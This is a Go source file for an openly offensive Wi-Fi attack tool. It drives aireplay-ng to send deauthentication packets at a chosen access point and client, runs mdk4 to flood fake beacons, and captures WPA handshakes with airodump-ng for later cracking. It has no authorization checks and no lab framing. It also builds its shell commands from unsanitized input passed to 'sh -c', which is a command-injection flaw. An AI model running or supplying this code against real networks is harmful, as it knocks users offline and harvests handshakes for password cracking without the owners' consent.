package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type RealAttack struct {
	Running   bool
	StopChan  chan struct{}
	mu        sync.Mutex
	Packets   int64
	StartTime time.Time
}

type AttackParams struct {
	Iface   string `json:"iface"`
	BSSID   string `json:"bssid"`
	Station string `json:"station"`
	SSIDs   string `json:"ssids"`
	Count   int    `json:"count"`
	Rate    int    `json:"rate"`
	Timeout int    `json:"timeout"`
	Type    string `json:"type"`
}

func NewRealAttack() *RealAttack {
	return &RealAttack{StopChan: make(chan struct{})}
}

func (a *RealAttack) Deauth(iface, bssid, station string, count int) error {
	a.mu.Lock()
	a.Running = true
	a.StartTime = time.Now()
	a.Packets = 0
	a.mu.Unlock()

	defer func() {
		a.mu.Lock()
		a.Running = false
		a.mu.Unlock()
	}()

	fmt.Printf("[GO-ATTACK] Deauth: %s -> %s on %s (%d packets)\n", bssid, station, iface, count)

	if runtime.GOOS != "linux" {
		return fmt.Errorf("deauth requires Linux with monitor mode")
	}

	if count <= 0 {
		count = 64
	}

	pktCount := 0
	for i := 0; i < count; i++ {
		select {
		case <-a.StopChan:
			fmt.Printf("[GO-ATTACK] Deauth stopped at packet %d\n", pktCount)
			return nil
		default:
		}

		cmdStr := fmt.Sprintf("aireplay-ng -0 1 -a %s -c %s %s 2>/dev/null", bssid, station, iface)
		exec.Command("sh", "-c", cmdStr).Run()
		pktCount++
		a.mu.Lock()
		a.Packets++
		a.mu.Unlock()

		if pktCount%10 == 0 {
			fmt.Printf("[GO-ATTACK] Deauth packets sent: %d/%d\n", pktCount, count)
		}
		time.Sleep(10 * time.Millisecond)
	}

	fmt.Printf("[GO-ATTACK] Deauth complete: %d packets sent\n", pktCount)
	return nil
}

func (a *RealAttack) BeaconFlood(iface string, ssids string, count int) error {
	a.mu.Lock()
	a.Running = true
	a.StartTime = time.Now()
	a.Packets = 0
	a.mu.Unlock()

	defer func() {
		a.mu.Lock()
		a.Running = false
		a.mu.Unlock()
	}()

	ssidList := strings.Split(ssids, ",")
	fmt.Printf("[GO-ATTACK] Beacon flood on %s with %d SSIDs (%d beacons each)\n", iface, len(ssidList), count)

	if runtime.GOOS != "linux" {
		return fmt.Errorf("beacon flood requires Linux with monitor mode")
	}

	if count <= 0 {
		count = 100
	}

	pktCount := 0
	for i := 0; i < count; i++ {
		for _, ssid := range ssidList {
			select {
			case <-a.StopChan:
				fmt.Printf("[GO-ATTACK] Beacon flood stopped at %d packets\n", pktCount)
				return nil
			default:
			}

			ssid = strings.TrimSpace(ssid)
			if ssid == "" {
				ssid = "HackIT"
			}

			cmdStr := fmt.Sprintf("mdk4 %s b -n %s -c 1 2>/dev/null &", iface, ssid)
			exec.Command("sh", "-c", cmdStr).Run()
			pktCount++
			a.mu.Lock()
			a.Packets++
			a.mu.Unlock()
		}
		time.Sleep(5 * time.Millisecond)
	}

	exec.Command("sh", "-c", fmt.Sprintf("killall mdk4 2>/dev/null")).Run()

	fmt.Printf("[GO-ATTACK] Beacon flood complete: %d packets\n", pktCount)
	return nil
}

func (a *RealAttack) CaptureHandshake(iface, bssid string, timeout int) (string, error) {
	a.mu.Lock()
	a.Running = true
	a.StartTime = time.Now()
	a.Packets = 0
	a.mu.Unlock()

	defer func() {
		a.mu.Lock()
		a.Running = false
		a.mu.Unlock()
	}()

	if timeout <= 0 {
		timeout = 30
	}

	fmt.Printf("[GO-ATTACK] Capturing handshake for %s on %s (timeout: %ds)\n", bssid, iface, timeout)

	if runtime.GOOS != "linux" {
		return "", fmt.Errorf("handshake capture requires Linux with monitor mode")
	}

	outFile := fmt.Sprintf("handshake_%s_%d.cap", strings.ReplaceAll(bssid, ":", ""), time.Now().Unix())

	cmdStr := fmt.Sprintf("airodump-ng -c 1 --bssid %s -w %s %s 2>/dev/null &", bssid, strings.TrimSuffix(outFile, ".cap"), iface)
	exec.Command("sh", "-c", cmdStr).Run()

	defer exec.Command("sh", "-c", "killall airodump-ng 2>/dev/null").Run()

	deadline := time.After(time.Duration(timeout) * time.Second)
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-a.StopChan:
			fmt.Println("[GO-ATTACK] Handshake capture stopped")
			return "", nil
		case <-deadline:
			fmt.Println("[GO-ATTACK] Handshake capture timed out")
			return "", fmt.Errorf("handshake capture timed out after %ds", timeout)
		case <-ticker.C:
			a.mu.Lock()
			a.Packets++
			a.mu.Unlock()

			if _, err := os.Stat(outFile); err == nil {
				out, _ := exec.Command("sh", "-c", fmt.Sprintf("aircrack-ng %s 2>/dev/null | grep '1 handshake'", outFile)).CombinedOutput()
				if strings.Contains(string(out), "1 handshake") {
					fmt.Printf("[GO-ATTACK] Handshake captured: %s\n", outFile)
					return outFile, nil
				}
			}
		}
	}
}

func (a *RealAttack) ExecuteAttack(name string, params AttackParams) error {
	switch name {
	case "deauth":
		return a.Deauth(params.Iface, params.BSSID, params.Station, params.Count)
	case "beacon_flood":
		return a.BeaconFlood(params.Iface, params.SSIDs, params.Count)
	case "capture_handshake":
		result, err := a.CaptureHandshake(params.Iface, params.BSSID, params.Timeout)
		if err != nil {
			return err
		}
		resultData := map[string]string{
			"type":   "handshake_capture",
			"bssid":  params.BSSID,
			"file":   result,
			"status": "complete",
		}
		out, _ := json.Marshal(resultData)
		fmt.Println(string(out))
		return nil
	default:
		return fmt.Errorf("unknown attack type: %s", name)
	}
}

func (a *RealAttack) Stop() {
	a.mu.Lock()
	defer a.mu.Unlock()

	if a.Running {
		close(a.StopChan)
		a.StopChan = make(chan struct{})
		exec.Command("sh", "-c", "killall aireplay-ng mdk4 airodump-ng 2>/dev/null").Run()
		fmt.Println("[GO-ATTACK] All attacks stopped")
	}
}

func (a *RealAttack) PrintJSON() {
	a.mu.Lock()
	defer a.mu.Unlock()

	elapsed := time.Since(a.StartTime).Seconds()
	data := map[string]interface{}{
		"running": a.Running,
		"packets": a.Packets,
		"elapsed": elapsed,
		"rate":    float64(a.Packets) / (elapsed + 0.001),
	}

	out, _ := json.Marshal(data)
	fmt.Println(string(out))
}

var _ = bufio.NewScanner
var _ = strconv.Atoi
var _ = os.Stat
